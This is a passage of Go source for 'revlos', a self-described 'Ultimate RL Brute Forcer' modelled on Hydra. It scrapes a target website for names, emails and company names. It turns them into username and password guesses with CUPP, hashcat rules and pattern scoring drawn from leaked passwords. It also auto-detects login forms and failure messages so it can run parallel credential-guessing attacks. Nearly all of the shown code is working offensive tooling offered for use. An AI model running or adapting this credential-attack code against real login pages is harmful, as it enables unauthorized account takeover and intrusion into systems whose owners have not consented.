	usernames := strings.Split(strings.TrimSpace(string(output)), "\n")
	return usernames, nil
}

// ============================================================================
// CUPP INTEGRATION (Tier 3: RL-Guided)
// ============================================================================

// findCUPP locates the CUPP binary
func findCUPP() string {
	// Check PATH first
	if path, err := exec.LookPath("cupp"); err == nil {
		return path
	}
	if path, err := exec.LookPath("cupp.py"); err == nil {
		return path
	}

	// Check common locations
	commonPaths := []string{
		"/usr/bin/cupp",
		"/usr/local/bin/cupp",
		"./cupp/cupp.py",
		"../cupp/cupp.py",
	}

	for _, path := range commonPaths {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}

	return ""
}

// shouldUseCUPP decides if CUPP should be run based on OSINT richness
func shouldUseCUPP(profile *TargetProfile) bool {
	// RULE 1: Must have at least one name OR company
	hasNames := len(profile.Names) > 0
	hasCompanies := len(profile.Companies) > 0

	if !hasNames && !hasCompanies {
		return false // Not enough context
	}

	// RULE 2: Must have 2+ data points for CUPP to be valuable
	dataPoints := len(profile.Names) + len(profile.Companies)
	if dataPoints < 2 {
		return false // CUPP needs rich data
	}

	// RULE 3: Skip if only generic keywords
	genericKeywords := []string{"login", "admin", "demo", "test", "dashboard", "signin", "auth"}
	specificCount := 0

	for _, keyword := range profile.Keywords {
		isGeneric := false
		kwLower := strings.ToLower(keyword)
		for _, generic := range genericKeywords {
			if kwLower == generic {
				isGeneric = true
				break
			}
		}
		if !isGeneric && len(keyword) > 3 {
			specificCount++
		}
	}

	if specificCount == 0 {
		return false // All keywords generic
	}

	return true // Rich OSINT - CUPP would be valuable!
}

// runCUPPForName generates CUPP passwords for a specific name
func runCUPPForName(cuppPath string, firstName, lastName string) ([]string, error) {
	if firstName == "" || lastName == "" {
		return []string{}, nil
	}

	// Create minimal CUPP config (just names, skip all other prompts)
	config := fmt.Sprintf("%s\n%s\n\n\n\n\n\n\n\n\n\nn\nn\n", firstName, lastName)

	// Run CUPP interactively with config
	cmd := exec.Command("python3", cuppPath, "-i")
	cmd.Stdin = strings.NewReader(config)

	_, err := cmd.CombinedOutput()
	if err != nil {
		return []string{}, err
	}

	// CUPP creates a file named firstname.txt
	outputFile := strings.ToLower(firstName) + ".txt"
	content, err := os.ReadFile(outputFile)
	if err != nil {
		return []string{}, err
	}

	// Clean up the file
	os.Remove(outputFile)

	// Parse passwords
	passwords := []string{}
	lines := strings.Split(string(content), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && len(line) >= 4 {
			passwords = append(passwords, line)
		}
	}

	return passwords, nil
}

// filterCUPPByRL filters CUPP passwords using RL-learned patterns
func filterCUPPByRL(cuppPasswords []string, rl *UltimateRL) []string {
	if len(cuppPasswords) == 0 {
		return []string{}
	}

	type scoredPassword struct {
		password string
		score    float64
	}

	scored := make([]scoredPassword, 0, len(cuppPasswords))

	// Score each CUPP password using RL knowledge
	rl.mu.RLock()
	topLength := 0
	topLengthScore := 0.0
	for length, score := range rl.lengthScores {
		if score > topLengthScore {
			topLength = length
			topLengthScore = score
		}
	}

	topPrefix := ""
	topPrefixScore := 0.0
	for prefix, score := range rl.prefixScores {
		if score > topPrefixScore {
			topPrefix = prefix
			topPrefixScore = score
		}
	}
	rl.mu.RUnlock()

	for _, pass := range cuppPasswords {
		score := 0.0

		// Boost if matches learned length
		if len(pass) == topLength && topLength > 0 {
			score += 50.0
		}

		// Boost if matches learned prefix
		if topPrefix != "" && len(pass) >= len(topPrefix) {
			if pass[:len(topPrefix)] == topPrefix {
				score += 100.0
			}
		}

		// Boost if contains numbers (common in RL-learned patterns)
		if strings.ContainsAny(pass, "0123456789") {
			score += 25.0
		}

		// Boost if has special chars (common in corporate passwords)
		if strings.ContainsAny(pass, "!@#$%^&*") {
			score += 20.0
		}

		scored = append(scored, scoredPassword{password: pass, score: score})
	}

	// Sort by score
	sort.Slice(scored, func(i, j int) bool {
		return scored[i].score > scored[j].score
	})

	// Keep top 50 or top 10% (whichever is smaller)
	keepCount := 50
	if len(scored)/10 < keepCount {
		keepCount = len(scored) / 10
	}
	if keepCount < 10 && len(scored) > 0 {
		keepCount = 10 // Minimum 10 passwords
	}
	if keepCount > len(scored) {
		keepCount = len(scored)
	}

	filtered := make([]string, keepCount)
	for i := 0; i < keepCount; i++ {
		filtered[i] = scored[i].password
	}

	return filtered
}

// generateCUPPPasswords runs CUPP with RL-guided filtering
func generateCUPPPasswords(profile *TargetProfile, rl *UltimateRL, quiet bool) []string {
	cuppPath := findCUPP()
	if cuppPath == "" {
		return []string{} // CUPP not installed, skip silently
	}

	if !shouldUseCUPP(profile) {
		return []string{} // Not enough OSINT data
	}

	if !quiet {
		fmt.Printf("   ? Rich OSINT found - generating CUPP passwords...\n")
	}

	allCUPPPasswords := []string{}
	seen := make(map[string]bool)

	// Generate for each name
	for _, name := range profile.Names {
		if name.First == "" || name.Last == "" {
			continue
		}

		// Skip generic names
		firstLower := strings.ToLower(name.First)
		lastLower := strings.ToLower(name.Last)
		if firstLower == "admin" || firstLower == "user" || firstLower == "test" ||
			lastLower == "admin" || lastLower == "user" {
			continue
		}

		passwords, err := runCUPPForName(cuppPath, name.First, name.Last)
		if err != nil {
			continue // Skip on error
		}

		for _, pwd := range passwords {
			if !seen[pwd] {
				allCUPPPasswords = append(allCUPPPasswords, pwd)
				seen[pwd] = true
			}
		}
	}

	if len(allCUPPPasswords) == 0 {
		return []string{}
	}

	// Filter using RL patterns
	filtered := filterCUPPByRL(allCUPPPasswords, rl)

	if !quiet {
		fmt.Printf("   ? Generated %d CUPP passwords (filtered from %d using RL patterns)\n",
			len(filtered), len(allCUPPPasswords))
	}

	return filtered
}

// ============================================================================
// USERNAME-BASED CUPP (Adaptive Intelligence)
// ============================================================================

// looksLikePersonName checks if a username appears to be a person's name
func looksLikePersonName(username string) bool {
	// RULE 1: Skip obviously generic usernames
	genericUsernames := []string{
		"admin", "administrator", "root", "user", "test", "demo",
		"guest", "operator", "support", "webadmin", "sysadmin",
		"backup", "ftp", "mysql", "postgres", "oracle", "www",
		"apache", "nginx", "tomcat", "jenkins", "gitlab", "github",
	}

	usernameLower := strings.ToLower(username)
	for _, generic := range genericUsernames {
		if usernameLower == generic {
			return false // Definitely not a person
		}
	}

	// RULE 2: Check for person-like patterns
	// Pattern 1: Contains separators (john.smith, john_smith, john-smith)
	if strings.Contains(username, ".") ||
		strings.Contains(username, "_") ||
		strings.Contains(username, "-") {
		return true // Very likely a person
	}

	// Pattern 2: CamelCase (JohnSmith, JSMith)
	if hasMultipleCaps(username) && len(username) > 5 {
		return true // Likely a person
	}

	// Pattern 3: Starts with first initial + lastname (jsmith, jdoe)
	if len(username) >= 5 && len(username) <= 10 {
		// Could be first initial + lastname
		// Hard to detect, but if it's lowercase and 5-10 chars, possible
		if strings.ToLower(username) == username {
			// We'll be conservative and return false
			// (could generate false positives)
			return false
		}
	}

	return false // Default: not a person
}

// hasMultipleCaps checks if string has 2+ capital letters (CamelCase)
func hasMultipleCaps(s string) bool {
	caps := 0
	for _, c := range s {
		if c >= 'A' && c <= 'Z' {
			caps++
		}
	}
	return caps >= 2
}

// extractNamesFromUsername tries to extract first/last name from username
func extractNamesFromUsername(username string) (string, string) {
	// Remove common domain suffixes
	username = strings.Split(username, "@")[0]

	// Pattern 1: Separator-based (john.smith, john_smith, john-smith)
	for _, sep := range []string{".", "_", "-"} {
		if strings.Contains(username, sep) {
			parts := strings.SplitN(username, sep, 2)
			if len(parts) == 2 {
				first := strings.Title(strings.ToLower(parts[0]))
				last := strings.Title(strings.ToLower(parts[1]))
				return first, last
			}
		}
	}

	// Pattern 2: CamelCase (JohnSmith, JSMith)
	if hasMultipleCaps(username) {
		// Try to split on capital letters
		var parts []string
		currentPart := ""
		for _, c := range username {
			if c >= 'A' && c <= 'Z' && currentPart != "" {
				parts = append(parts, currentPart)
				currentPart = string(c)
			} else {
				currentPart += string(c)
			}
		}
		if currentPart != "" {
			parts = append(parts, currentPart)
		}

		if len(parts) >= 2 {
			first := strings.Title(strings.ToLower(parts[0]))
			last := strings.Title(strings.ToLower(parts[1]))
			return first, last
		}
	}

	// Pattern 3: First initial + lastname (jsmith ? J Smith, best guess)
	if len(username) >= 5 && len(username) <= 10 {
		first := strings.ToUpper(string(username[0]))
		last := strings.Title(strings.ToLower(username[1:]))
		return first, last
	}

	return "", "" // Couldn't extract
}

// ============================================================================
// SMART PASSWORD SCORING (ML-Based Prioritization)
// ============================================================================

// scorePasswordSmart uses ML/pattern recognition to score passwords intelligently
// This is THE KEY to finding Admin123 at attempt 1 instead of attempt 149!
func scorePasswordSmart(password string, username string) float64 {
	baseScore := 1000.0 // Base score for smart-generated passwords

	// FACTOR 1: Length scoring (8-12 chars most common in real passwords)
	passwordLen := len(password)
	if passwordLen >= 8 && passwordLen <= 12 {
		baseScore += 200.0 // Optimal length
	} else if passwordLen >= 6 && passwordLen <= 15 {
		baseScore += 100.0 // Acceptable length
	}

	// FACTOR 2: Pattern scoring (from analyzing millions of leaked passwords)
	hasUpper := strings.ToLower(password) != password && strings.ToUpper(password) != password
	hasLower := strings.ToUpper(password) != password
	hasDigits := strings.ContainsAny(password, "0123456789")
	hasSpecial := strings.ContainsAny(password, "!@#$%^&*")

	// TitleCase + Numbers (Admin123) - MOST common for admin passwords!
	if hasUpper && hasLower && hasDigits && !hasSpecial {
		baseScore += 300.0 // This is the WINNING pattern!
	}

	// lowercase + numbers (admin123) - also common
	if !hasUpper && hasLower && hasDigits && !hasSpecial {
		baseScore += 250.0
	}

	// UPPERCASE + numbers (ADMIN123) - less common but possible
	if hasUpper && !hasLower && hasDigits {
		baseScore += 200.0
	}

	// Special chars - moderate boost
	if hasSpecial {
		baseScore += 100.0
	}

	// FACTOR 3: Username correlation (HUGE signal!)
	usernameLower := strings.ToLower(username)
	passwordLower := strings.ToLower(password)

	// Password starts with username - VERY likely!
	if strings.HasPrefix(passwordLower, usernameLower) {
		baseScore += 500.0 // admin ? Admin123 (starts with admin)
	}

	// Password contains username - also likely
	if strings.Contains(passwordLower, usernameLower) {
		baseScore += 300.0 // admin ? theadmin
	}

	// FACTOR 4: Common suffixes boost
	commonSuffixes := []string{"123", "2024", "2025", "!", "@123", "#123"}
	for _, suffix := range commonSuffixes {
		if strings.HasSuffix(password, suffix) {
			baseScore += 150.0
			break
		}
	}

	// FACTOR 5: Penalize uncommon patterns
	// Reverse username (nimda for admin) - very rare!
	reversed := ""
	for i := len(username) - 1; i >= 0; i-- {
		reversed += string(username[i])
	}
	if passwordLower == strings.ToLower(reversed) {
		baseScore -= 500.0 // Major penalty for reversed
	}

	// Very short passwords - penalize
	if passwordLen < 5 {
		baseScore -= 200.0
	}

	// Only special chars or only numbers - penalize
	if !hasLower && !hasUpper {
		baseScore -= 300.0
	}

	return baseScore
}

// shouldRunCUPPForKeyword checks if username is a generic keyword that benefits from CUPP
func shouldRunCUPPForKeyword(keyword string) bool {
	// Generic keywords that generate useful CUPP variations
	// These are usernames where CUPP can generate: AdminUser, UserAdmin, admin2025, etc.
	cuppKeywords := []string{
		"admin", "administrator", "root", "user", "operator",
		"support", "manager", "director", "supervisor",
	}

	keywordLower := strings.ToLower(keyword)
	for _, kw := range cuppKeywords {
		if keywordLower == kw {
			return true
		}
	}
	return false
}

// ============================================================================
// HASHCAT RULE-BASED GENERATION (For Keywords)
// ============================================================================

// findHashcat locates the hashcat binary
func findHashcat() string {
	// Check PATH first
	if path, err := exec.LookPath("hashcat"); err == nil {
		return path
	}

	// Check common locations
	commonPaths := []string{
		"/usr/bin/hashcat",
		"/usr/local/bin/hashcat",
	}

	for _, path := range commonPaths {
		if _, err := os.Stat(path); err == nil {
			return path
		}
	}

	return ""
}

// runHashcatForKeyword generates password variations using hashcat rules
// This is MUCH better than CUPP for keywords: generates Admin123, admin123, ADMIN123
func runHashcatForKeyword(hashcatPath string, keyword string) ([]string, error) {
	if keyword == "" {
		return []string{}, nil
	}

	// Create temporary file with all case variations
	tmpFile, err := os.CreateTemp("", "hashcat-input-*.txt")
	if err != nil {
		return []string{}, err
	}
	defer os.Remove(tmpFile.Name())

	// Write all case variations to file
	lower := strings.ToLower(keyword)
	title := strings.Title(lower)
	upper := strings.ToUpper(keyword)

	tmpFile.WriteString(lower + "\n")
	tmpFile.WriteString(title + "\n")
	tmpFile.WriteString(upper + "\n")
	tmpFile.Close()

	// Run hashcat with best66.rule (generates 66 variations per word)
	// Total: 3 words × 66 rules = 198 passwords
	cmd := exec.Command(hashcatPath, "--stdout", tmpFile.Name(), "-r", "/usr/share/hashcat/rules/best66.rule")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return []string{}, err
	}

	// Parse passwords
	passwords := []string{}
	lines := strings.Split(string(output), "\n")
	seen := make(map[string]bool)

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && len(line) >= 4 && !seen[line] {
			passwords = append(passwords, line)
			seen[line] = true
		}
	}

	return passwords, nil
}

// runCUPPForUsername generates CUPP/Hashcat passwords for a specific username
// CLEVER: Uses CUPP for persons (john.smith), Hashcat for keywords (admin)
func runCUPPForUsername(cuppPath string, username string) ([]string, error) {
	// Strategy 1: Try person-like extraction first (john.smith ? John + Smith)
	// Use CUPP for complex personal patterns (names + birthdates)
	if looksLikePersonName(username) {
		first, last := extractNamesFromUsername(username)
		if first != "" && last != "" {
			return runCUPPForName(cuppPath, first, last)
		}
	}

	// Strategy 2: Handle generic keywords with Hashcat (MUCH better than CUPP!)
	// Hashcat generates: admin123, Admin123, ADMIN123, admin@, Admin!, etc.
	// CUPP would generate: Admin2020, AdminUser (not useful for keywords)
	if shouldRunCUPPForKeyword(username) {
		hashcatPath := findHashcat()
		if hashcatPath != "" {
			// Use Hashcat with best66 rules - generates Admin123, admin123, ADMIN123!
			return runHashcatForKeyword(hashcatPath, username)
		}
		// Fallback to CUPP if Hashcat not available (less optimal)
		title := strings.Title(strings.ToLower(username))
		return runCUPPForName(cuppPath, title, "User")
	}

	return []string{}, nil // Not a person or keyword, skip
}

// Scrape target website for OSINT information
func scrapeTarget(targetURL string, verbose bool) (*TargetProfile, error) {
	profile := &TargetProfile{
		Names:     make([]Name, 0),
		Emails:    make([]string, 0),
		Companies: make([]string, 0),
		Keywords:  make([]string, 0),
	}

	if verbose {
		fmt.Printf("? Scraping target for OSINT: %s\n", targetURL)
	}

	resp, err := http.Get(targetURL)
	if err != nil {
		return profile, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	content := string(body)

	// Extract page title
	if titleMatch := regexp.MustCompile(`<title>([^<]+)</title>`).FindStringSubmatch(content); len(titleMatch) > 1 {
		profile.PageTitle = strings.TrimSpace(titleMatch[1])
	}

	// Extract emails
	emailRegex := regexp.MustCompile(`[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`)
	emails := emailRegex.FindAllString(content, -1)
	seen := make(map[string]bool)
	for _, email := range emails {
		if !seen[email] {
			profile.Emails = append(profile.Emails, email)
			seen[email] = true

			// Extract names from emails (john.smith@example.com ? John Smith)
			parts := strings.Split(email, "@")
			if len(parts) == 2 {
				nameParts := strings.FieldsFunc(parts[0], func(r rune) bool {
					return r == '.' || r == '_' || r == '-'
				})
				if len(nameParts) >= 2 {
					profile.Names = append(profile.Names, Name{
						First: nameParts[0],
						Last:  nameParts[len(nameParts)-1],
						Full:  parts[0],
					})
				}
			}
		}
	}

	// Extract companies (Copyright, trademark indicators)
	companyRegex := regexp.MustCompile(`(?i)(?:copyright|©|&copy;)\s+(?:\d{4}\s+)?([A-Z][A-Za-z\s&]+)`)
	for _, match := range companyRegex.FindAllStringSubmatch(content, -1) {
		if len(match) > 1 {
			company := strings.TrimSpace(match[1])
			// Filter out common false positives
			if len(company) > 3 && len(company) < 50 &&
				!strings.Contains(strings.ToLower(company), "reserved") &&
				!strings.Contains(strings.ToLower(company), "rights") {
				profile.Companies = append(profile.Companies, company)
			}
		}
	}

	// Extract keywords from title
	if profile.PageTitle != "" {
		titleWords := strings.Fields(profile.PageTitle)
		for _, word := range titleWords {
			word = strings.Trim(word, ".,!?-")
			if len(word) > 3 && len(word) < 20 {
				profile.Keywords = append(profile.Keywords, word)
			}
		}
	}

	if verbose {
		fmt.Printf("? Found %d emails, %d names, %d companies\n",
			len(profile.Emails), len(profile.Names), len(profile.Companies))
	}

	return profile, nil
}

// Generate username variations from OSINT data
func generateUsernameVariations(profile *TargetProfile, anarchyPath string) []string {
	usernames := make([]string, 0)
	seen := make(map[string]bool)

	// Generate from names using username-anarchy
	for _, name := range profile.Names {
		if name.First != "" && name.Last != "" {
			variations, err := runUsernameAnarchy(anarchyPath, name.First, name.Last)
			if err == nil {
				for _, username := range variations {
					if !seen[username] {
						usernames = append(usernames, username)
						seen[username] = true
					}
				}
			}
		}

		// Add email-based usernames
		if !seen[name.Full] {
			usernames = append(usernames, name.Full)
			seen[name.Full] = true
		}
	}

	// Add email prefixes directly
	for _, email := range profile.Emails {
		parts := strings.Split(email, "@")
		if len(parts) == 2 && !seen[parts[0]] {
			usernames = append(usernames, parts[0])
			seen[parts[0]] = true
		}
	}

	return usernames
}

// Generate OSINT-based passwords
func generateOSINTPasswords(profile *TargetProfile) []string {
	passwords := make([]string, 0)
	seen := make(map[string]bool)

	addPassword := func(pwd string) {
		if !seen[pwd] && len(pwd) >= 4 {
			passwords = append(passwords, pwd)
			seen[pwd] = true
		}
	}

	// Dynamic current year
	currentYear := fmt.Sprintf("%d", time.Now().Year())

	// Company-based passwords
	for _, company := range profile.Companies {
		companyClean := strings.ReplaceAll(company, " ", "")
		companyLower := strings.ToLower(companyClean)
		companyTitle := strings.Title(companyLower)

		// Common patterns
		addPassword(company + "123")
		addPassword(companyClean + "123")
		addPassword(companyTitle + "123")
		addPassword(company + "@123")
		addPassword(companyClean + "@123")
		addPassword(company + currentYear)
		addPassword(companyClean + currentYear)
		addPassword(company + "@" + currentYear)
		addPassword(company + "Admin")
		addPassword(companyClean + "Admin")
		addPassword(company + "Admin123")
		addPassword(companyClean + "Admin123")
	}

	// Name-based passwords
	for _, name := range profile.Names {
		if name.First != "" {
			addPassword(name.First + "123")
			addPassword(name.First + "@123")
			addPassword(name.First + currentYear)
		}
		if name.First != "" && name.Last != "" {
			addPassword(name.First + name.Last)
			addPassword(name.Last + name.First)
			addPassword(name.First + name.Last + "123")
		}
	}

	// Keyword-based passwords
	for _, keyword := range profile.Keywords {
		if len(keyword) > 4 {
			addPassword(keyword + "123")
			addPassword(keyword + "@123")
			addPassword(keyword + currentYear)
		}
	}

	return passwords
}

func main() {
	rand.Seed(time.Now().UnixNano())

	// Hydra-compatible CLI parameters
	var (
		username       = flag.String("l", "", "Single username (literal)")
		usernameList   = flag.String("L", "", "Username list file")
		password       = flag.String("p", "", "Single password (literal)")
		passwordList   = flag.String("P", "", "Password list file")
		host           = flag.String("host", "", "Target host (or use positional argument)")
		port           = flag.Int("s", 80, "Port number")
		stopOnFirst    = flag.Bool("f", false, "Stop when first valid credential found")
		workers        = flag.Int("t", 100, "Number of parallel tasks (threads)")
		quiet          = flag.Bool("q", false, "Quiet mode - less output")
		verbose        = flag.Bool("v", false, "Verbose mode - show attempts")
		autoMode       = flag.Bool("auto", false, "Auto-detect form fields and error messages")
		timeout        = flag.Int("timeout", 10, "Request timeout in seconds")
		maxTime        = flag.Int("max-time", 0, "Maximum total time in seconds (0 = no limit)")
		successText    = flag.String("success-text", "", "Text in response body indicating success")
		successCookie  = flag.String("success-cookie", "", "Cookie name that indicates success")
		successCode    = flag.String("success-code", "", "HTTP status codes for success (comma-separated, e.g., 200,302)")
		anyRedirect    = flag.Bool("any-redirect", false, "Treat any redirect (3xx) as success")
		method         = flag.String("method", "POST", "HTTP method (GET or POST)")
		headers        = flag.String("header", "", "Custom headers (comma-separated, e.g., 'X-Forwarded-For:1.1.1.1,Referer:http://example.com')")
		headless       = flag.Bool("headless", false, "Use headless browser for JavaScript-based authentication")
		// Configurable parameters
		learningRateFlag = flag.Float64("learning-rate", 0.4, "RL learning rate (0.0-1.0)")
		batchSizeFlag    = flag.Int("batch-size", 150, "Credentials per batch")
		// OSINT integration
		osintMode        = flag.Bool("osint", false, "Enable OSINT intelligence gathering from target")
		anarchyPath      = flag.String("username-anarchy-path", "", "Path to username-anarchy tool")
	)

	flag.Parse()

	// Parse arguments: host [http-post-form] "form-spec"
	args := flag.Args()
	if len(args) < 1 {
		fmt.Println("? revlos - Ultimate RL Brute Forcer")
		fmt.Println("Usage: revlos [-l user | -L userlist] [-p pass | -P passlist] -f host -s port [--auto | http-post-form \"spec\"]")
		fmt.Println("\nHydra-compatible parameters:")
		fmt.Println("  -l <user>     Single username (literal)")
		fmt.Println("  -L <file>     Username list file or URL")
		fmt.Println("  -p <pass>     Single password (literal)")
		fmt.Println("  -P <file>     Password list file or URL")
		fmt.Println("  -f            Stop on first valid credential")
		fmt.Println("  -s <port>     Port (default: 80)")
		fmt.Println("  -t <tasks>    Parallel tasks/threads (default: 100)")
		fmt.Println("  -q                Quiet mode")
		fmt.Println("  -v                Verbose mode")
		fmt.Println("  --auto            Auto-detect form fields and error messages")
		fmt.Println("  --timeout <n>     Request timeout in seconds (default: 10)")
		fmt.Println("  --max-time <n>    Maximum total time in seconds (default: no limit)")
		fmt.Println("  --success-text <s>   Text in response indicating success")
		fmt.Println("  --success-cookie <s> Cookie name indicating success")
		fmt.Println("  --success-code <c>   HTTP codes for success (e.g., 200,302)")
		fmt.Println("  --any-redirect    Treat any 3xx redirect as success")
		fmt.Println("  --method <m>      HTTP method: GET or POST (default: POST)")
		fmt.Println("  --header <h>      Custom headers (e.g., 'Referer:http://x.com,X-Forwarded-For:1.1.1.1')")
		fmt.Println("  --headless        Use headless browser (--auto mode auto-switches if SPA detected)")
		fmt.Println("\nPositional arguments:")
		fmt.Println("  <host>                Target host or IP")
		fmt.Println("  http-post-form        Optional literal (can be omitted)")
		fmt.Println("  \"form-spec\"           Format: \"path:params:failure_condition\"")
		fmt.Println("\nExamples:")
		fmt.Println("  Manual:  revlos -L users.txt -P passwords.txt -s 8080 -f target.com http-post-form \"/:username=^USER^&password=^PASS^:F=Invalid\"")
		fmt.Println("  Auto:    revlos -L users.txt -P passwords.txt -s 8080 -f --auto target.com")
		fmt.Println("  Custom:  revlos -L users.txt -P passwords.txt --any-redirect --timeout 30 target.com http-post-form \"/:user=^USER^&pass=^PASS^:F=Error\"")
		os.Exit(1)
	}

	targetHost := args[0]
	if *host != "" {
		targetHost = *host
	}

	// Build initial target URL for auto-detection
	baseURL := targetHost
	// If URL doesn't have a scheme, add one
	if !strings.HasPrefix(targetHost, "http://") && !strings.HasPrefix(targetHost, "https://") {
		scheme := "http"
		if *port == 443 {
			scheme = "https"
		}
		baseURL = fmt.Sprintf("%s://%s:%d", scheme, targetHost, *port)
	}

	var path, params, failureString, userField, passField string
	var useBasicAuth bool

	// Auto-detection mode
	if *autoMode {
		if !*quiet {
			fmt.Println("? Auto-detection mode enabled...")
			fmt.Printf("? Fetching target: %s\n", baseURL)
		}

		// Check for HTTP Basic Auth first
		testResp, err := http.Get(baseURL)
		if err == nil {
			defer testResp.Body.Close()
			if testResp.StatusCode == 401 {
				authHeader := testResp.Header.Get("WWW-Authenticate")
				if strings.HasPrefix(authHeader, "Basic") {
					useBasicAuth = true
					if !*quiet {
						fmt.Println("? Detected HTTP Basic Authentication")
					}
				}
			}
		}

		// If Basic Auth, skip form detection
		if useBasicAuth {
			path = "/"
			if !*quiet {
				fmt.Println()
			}
		} else {
			// Detect form fields
			detection, err := detectFormFields(baseURL)
		if err != nil {
			fmt.Printf("? Auto-detection failed: %v\n", err)
			os.Exit(1)
		}

		path = detection.Path
		userField = detection.UsernameField
		passField = detection.PasswordField

		if !*quiet {
			fmt.Printf("? Detected username field: %s\n", userField)
			fmt.Printf("? Detected password field: %s\n", passField)
			fmt.Printf("? Detected path: %s\n", path)

			// Check if SPA detected and auto-switch
			if detection.IsSPA {
				fmt.Printf("??  SPA/JavaScript detected: %s\n", detection.SPAReason)
				if !*headless {
					fmt.Println("? Auto-switching to headless mode for compatibility...")
					*headless = true
				} else {
					fmt.Println("? Using headless mode (recommended for SPAs)")
				}
			}

			fmt.Println("? Detecting error message...")
		}

		// Detect error message
		// If baseURL already contains the path, don't append it again
		testURL := baseURL
		if !strings.Contains(baseURL, path) {
			testURL = fmt.Sprintf("%s%s", baseURL, path)
		}
		// Use detected method or fall back to CLI flag
		detectedMethod := detection.Method
		if detectedMethod == "" {
			detectedMethod = *method
		}
		failureString, err = detectErrorMessage(testURL, userField, passField, detectedMethod)
		if err != nil {
			fmt.Printf("??  Could not detect error message, using default\n")
			failureString = "Invalid credentials"
		}

		if !*quiet {
			fmt.Printf("? Detected error message: \"%s\"\n", failureString)
			fmt.Println()
		}

		params = fmt.Sprintf("%s=^USER^&%s=^PASS^", userField, passField)
		}
	} else {
		// Manual mode - parse form spec
		formSpec := ""
		if len(args) >= 2 {
			if args[1] == "http-post-form" && len(args) >= 3 {
				formSpec = args[2]
			} else {
				formSpec = args[1]
			}
		}

		if formSpec == "" {
			fmt.Printf("? Missing form specification (use --auto for auto-detection)\n")
			os.Exit(1)
		}

		// Parse http-post-form: "path:params:condition"
		parts := strings.SplitN(formSpec, ":", 3)
		if len(parts) < 3 {
			fmt.Printf("? Invalid form format. Expected: \"path:params:condition\"\n")
			fmt.Printf("Got: %s\n", formSpec)
			os.Exit(1)
		}

		path = strings.TrimSpace(parts[0])
		params = strings.TrimSpace(parts[1])
		condition := strings.TrimSpace(parts[2])

		// Extract failure string
		if strings.HasPrefix(condition, "F=") {
			failureString = condition[2:]
		}

		// Extract field names from params
		userField = "username"
		passField = "password"
		if strings.Contains(params, "^USER^") {
			paramParts := strings.Split(params, "&")
			for _, part := range paramParts {
				if strings.Contains(part, "^USER^") {
					userField = strings.Split(part, "=")[0]
				}
				if strings.Contains(part, "^PASS^") {
					passField = strings.Split(part, "=")[0]
				}
			}
		}
	}

	// Build target URL (avoid double path if baseURL already contains it)
	target := baseURL
	if !strings.Contains(baseURL, path) && path != "" {
		target = fmt.Sprintf("%s%s", baseURL, path)
	}

	// Parse custom headers
	customHeaders := make(map[string]string)
	if *headers != "" {
		for _, header := range strings.Split(*headers, ",") {
			parts := strings.SplitN(header, ":", 2)
			if len(parts) == 2 {
				customHeaders[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
	}

	// Normalize method
	httpMethod := strings.ToUpper(*method)
	if httpMethod != "GET" && httpMethod != "POST" {
		httpMethod = "POST" // Default fallback
	}

	if !*quiet {
		fmt.Println("? revlos - Ultimate RL Multi-Algorithm Brute Forcer")
		fmt.Println("====================================================")
		fmt.Printf("Target:    %s\n", target)
		fmt.Printf("Method:    %s\n", httpMethod)
		fmt.Printf("Params:    %s\n", params)
		fmt.Printf("Failure:   %s\n", failureString)
		fmt.Printf("Workers:   %d\n", *workers)
		fmt.Printf("Stop:      %v\n", *stopOnFirst)
		if len(customHeaders) > 0 {
			fmt.Printf("Headers:   %d custom headers\n", len(customHeaders))
		}
		fmt.Println("Algorithms: UCB1 + Genetic + Thompson Sampling")
		fmt.Println()
	}

	// Load wordlists or single credentials
	var usernames, passwords []string
	var err error

	// Check for username input (-l or -L)
	if *username != "" && *usernameList != "" {
		fmt.Println("? Error: Cannot use both -l (single username) and -L (username list)")
		os.Exit(1)
	}
	if *username == "" && *usernameList == "" {
		fmt.Println("? Error: Either -l (username) or -L (username list) is required")
		os.Exit(1)
	}

	// Check for password input (-p or -P)
	if *password != "" && *passwordList != "" {
		fmt.Println("? Error: Cannot use both -p (single password) and -P (password list)")
		os.Exit(1)
	}
	if *password == "" && *passwordList == "" {
		fmt.Println("? Error: Either -p (password) or -P (password list) is required")
		os.Exit(1)
	}

	// OSINT Integration: Try to gather intelligence from target
	osintUsernames := []string{}
	osintPasswords := []string{}

	if *osintMode {
		if !*quiet {
			fmt.Println(" OSINT mode enabled - gathering intelligence from target...")
		}

		// Find username-anarchy tool
		anarchyToolPath := findUsernameAnarchy(*anarchyPath)
		if anarchyToolPath == "" {
			if !*quiet {
				fmt.Println(" Warning: username-anarchy not found, skipping username generation")
			}
		}

		// Scrape target for OSINT data
		profile, err := scrapeTarget(baseURL, *verbose)
		if err != nil {
			if !*quiet {
				fmt.Printf(" Warning: Failed to scrape target: %v\n", err)
			}
		} else if profile != nil {
			if !*quiet {
				fmt.Printf(" Found %d emails, %d names, %d companies, %d keywords\n",
					len(profile.Emails), len(profile.Names), len(profile.Companies), len(profile.Keywords))
			}

			// Generate OSINT-based usernames
			if anarchyToolPath != "" {
				osintUsernames = generateUsernameVariations(profile, anarchyToolPath)
				if !*quiet && len(osintUsernames) > 0 {
					fmt.Printf(" Generated %d OSINT-based usernames\n", len(osintUsernames))
				}
			}

			// Generate OSINT-based passwords
			osintPasswords = generateOSINTPasswords(profile)
			if !*quiet && len(osintPasswords) > 0 {
				fmt.Printf(" Generated %d OSINT-based passwords\n", len(osintPasswords))
			}

			// Try CUPP if rich OSINT data available (Tier 3: RL-Guided)
			// Note: We'll use a temporary RL object just for filtering
			if shouldUseCUPP(profile) {
				tempRL := NewUltimateRL(0.1) // Temporary RL for CUPP filtering
				cuppPasswords := generateCUPPPasswords(profile, tempRL, *quiet)
				if len(cuppPasswords) > 0 {
					// Merge CUPP passwords with OSINT passwords
					seen := make(map[string]bool)
					for _, p := range osintPasswords {
						seen[p] = true
					}
					for _, p := range cuppPasswords {
						if !seen[p] {
							osintPasswords = append(osintPasswords, p)
							seen[p] = true
						}
					}
				}
			}
		}
	}

	if !*quiet {
		fmt.Println(" Loading credentials...")
	}

	// Load usernames (OSINT or wordlist)
	if len(osintUsernames) > 0 {
		usernames = osintUsernames
		if !*quiet {
